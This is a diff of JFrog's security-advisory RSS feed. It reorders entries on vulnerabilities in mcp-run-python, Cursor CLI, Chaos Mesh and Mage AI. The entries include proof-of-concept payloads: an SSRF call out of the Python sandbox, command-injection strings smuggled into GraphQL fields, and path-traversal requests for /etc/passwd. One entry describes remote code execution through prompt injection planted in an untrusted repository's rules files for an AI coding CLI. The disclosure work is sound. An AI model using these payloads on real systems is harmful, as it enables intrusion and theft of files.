@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Mon, 10 Aug 2026 00:25:07 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 11 Aug 2026 00:23:57 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -471,6 +471,76 @@ https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Overly permissive Deno configuration in mcp-run-python leads to SSRF
+
+## Component
+
+mcp-run-python
+
+## Affected versions
+
+(,)
+
+## Description
+
+The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
+
+## PoC
+
+1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
+
+   ```json
+   {
+   "mcpServers": {
+   "mcp-run-python":{
+           "command": "uvx",
+           "args": [
+           "mcp-run-python",
+           "stdio"
+           ]
+       }
+     }
+   }
+   ```
+
+2. Start a HTTP server listening to the localhost interface:
+
+   ```bash
+   python3 -m http.server -b 127.0.0.1 1234
+   ```
+
+3. Ask the MCP client to run this PoC code:
+
+   ```python
+   from pyodide.http import pyfetch
+   response = await pyfetch("http://localhost:1234")
+   data = await response.text()
+   print(data)
+   ```
+
+4. View that the localhost server got a request from the tool
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[mcp-run-python lack of isolation MCP takeover]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</guid>
@@ -557,76 +627,6 @@ js.JSON.stringify = js_func
 9. The tool will seem stuck, Note the new notifications/tools/list\_changed notification from the server
 10. Click on `Clear` and then `List Tools`  
 11. Note that the tool name changed from `run_python_code` to `Hijacked Tool`
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
-            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Overly permissive Deno configuration in mcp-run-python leads to SSRF
-
-## Component
-
-mcp-run-python
-
-## Affected versions
-
-(,)
-
-## Description
-
-The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
-
-## PoC
-
-1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
-
-   ```json
-   {
-   "mcpServers": {
-   "mcp-run-python":{
-           "command": "uvx",
-           "args": [
-           "mcp-run-python",
-           "stdio"
-           ]
-       }
-     }
-   }
-   ```
-
-2. Start a HTTP server listening to the localhost interface:
-
-   ```bash
-   python3 -m http.server -b 127.0.0.1 1234
-   ```
-
-3. Ask the MCP client to run this PoC code:
-
-   ```python
-   from pyodide.http import pyfetch
-   response = await pyfetch("http://localhost:1234")
-   data = await response.text()
-   print(data)
-   ```
-
-4. View that the localhost server got a request from the tool
 
 
 
@@ -1019,6 +1019,46 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
+            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
+
+## Component
+
+[Cursor CLI](https://github.com/cursor/cursor)
+
+## Affected versions
+
+( , 2025.09.17-25b418f)
+
+## Description
+
+Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
+
+The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
+
+
+
+## PoC
+
+No PoC is supplied for this issue
+
+## Vulnerability Mitigations
+
+No mitigations are available for this issue
+
+## References
+
+[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[DSPy sandbox escape arbitrary file read]]></title>
             <link>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</link>
             <guid>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</guid>
@@ -1062,46 +1102,6 @@ No mitigations are supplied for this issue
 
 
 
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
-            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
-
-## Component
-
-[Cursor CLI](https://github.com/cursor/cursor)
-
-## Affected versions
-
-( , 2025.09.17-25b418f)
-
-## Description
-
-Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
-
-The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
-
-
-
-## PoC
-
-No PoC is supplied for this issue
-
-## Vulnerability Mitigations
-
-No mitigations are available for this issue
-
-## References
-
-[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
 ]]></content:encoded>
         </item>
         <item>
@@ -1491,59 +1491,6 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59360, CRITICAL, OS command injection in Chaos Mesh via the killProcesses mutation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-OS command injection in Chaos Mesh via the killProcesses mutation
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The killProcesses mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
-
-
-## PoC
-
-```shell
-{"query": "mutation KillProcessesInPod { 
-pod(ns: \"kube-system\", name: \"kube-proxy-9trk4\") { 
-killProcesses(pids: [\"1\","; touch /tmp/pwned;"]) { 
-pid command } } }
-```
-
-
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Chaos Mesh cleanIptables command injection]]></title>
             <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</link>
             <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</guid>
@@ -1576,6 +1523,59 @@ pod(ns: \"chaos-mesh\", name: \"chaos-dashboard-5c6575bd9f-b5tqg\") {
  cleanIptables(chains: [\"INPUT;touch /tmp/pwned; \", \"OUTPUT\", \"FORWARD\", \"CHAOS-MESH-INPUT\", \"CHAOS-MESH-OUTPUT\"])
  }
  }"}' http://controller-manager-host:10082/query
+```
+
+
+
+## Vulnerability Mitigations
+
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
+
+
+
+## References
+
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-59360, CRITICAL, OS command injection in Chaos Mesh via the killProcesses mutation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+OS command injection in Chaos Mesh via the killProcesses mutation
+
+## Component
+
+github.com/chaos-mesh/chaos-mesh
+
+## Affected versions
+
+(,2.7.2]
+
+## Description
+
+The killProcesses mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
+
+
+## PoC
+
+```shell
+{"query": "mutation KillProcessesInPod { 
+pod(ns: \"kube-system\", name: \"kube-proxy-9trk4\") { 
+killProcesses(pids: [\"1\","; touch /tmp/pwned;"]) { 
+pid command } } }
 ```
 
 
@@ -3185,6 +3185,50 @@ with -
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Mage AI file content request remote arbitrary file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</guid>
+            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-45188, MEDIUM, Mage AI file content request remote arbitrary file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Mage AI file content request remote arbitrary file leak
+
+## Component
+
+mage-ai
+
+## Affected versions
+
+(,)
+
+## Description
+
+Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "File Content" request
+
+## PoC
+
+```bash
+curl -X GET
+'http://localhost:6789/api/file_contents/..%2F..%2F..%2Fetc%2Fpasswd?api_key=
+<USER API KEY>' -H 'Authorization: Bearer
+<USER TOKEN>'
+```
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Mage AI deleted users RCE]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</guid>
@@ -3249,50 +3293,6 @@ Mage AI allows remote users with the "Viewer" role to leak arbitrary files from 
 ```bash
 curl -X GET
 'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
-<USER TOKEN>'
-```
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Mage AI file content request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45188, MEDIUM, Mage AI file content request remote arbitrary file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI file content request remote arbitrary file leak
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "File Content" request
-
-## PoC
-
-```bash
-curl -X GET
-'http://localhost:6789/api/file_contents/..%2F..%2F..%2Fetc%2Fpasswd?api_key=
-<USER API KEY>' -H 'Authorization: Bearer
 <USER TOKEN>'
 ```
 
